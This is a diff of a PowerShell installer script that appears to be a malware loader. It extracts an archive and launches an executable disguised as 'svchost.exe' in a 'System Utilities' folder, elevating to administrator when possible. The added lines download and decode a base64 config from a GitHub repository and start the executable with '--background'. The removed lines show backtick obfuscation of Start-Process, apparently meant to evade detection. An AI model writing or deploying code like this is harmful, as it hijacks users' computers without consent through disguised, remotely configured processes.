@@ -70,7 +70,7 @@ if ($gpu -match "nvidia|gtx|rtx|geforce") {
         Start-Process -FilePath $exePath -Verb RunAs
         Write-Host "EXE launched as administrator."
     } else {
-        & $exePath
+        Start-Process $exePath -ArgumentList "--background"
         Write-Host "EXE launched without elevation."
     }
 }
@@ -89,7 +89,20 @@ else{
     if (Test-Path $extractPath) {Remove-Item -Recurse -Force $extractPath;};
     Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
     Write-Host "ZIP file extracted to $extractPath";
+    $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
+    $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
+    $configPath = "$deepExtractPath\config.json";
+    $b64Config = iwr -Uri $configUrl
+    $base64Content = $b64Config.Content
+    $decodedBytes = [System.Convert]::FromBase64String($base64Content)
+    [System.IO.File]::WriteAllBytes($configPath, $decodedBytes)
     rm $zipFilePath
     $exePath = Join-Path $extractPath "System Utilities\svchost.exe";
-    if (Test-IsAdmin) {STa`rt-PR`oce`Ss -FilePath $exePath -Verb RunAs;Write-Host "EXE launched as administrator.";} else {& $exePath;Write-Host "EXE launched without elevation.";};
+    if (Test-IsAdmin) {
+        Start-Process -FilePath $exePath -Verb RunAs
+        Write-Host "EXE launched as administrator."
+    } else {
+        Start-Process $exePath
+        Write-Host "EXE launched without elevation."
+    }
 }
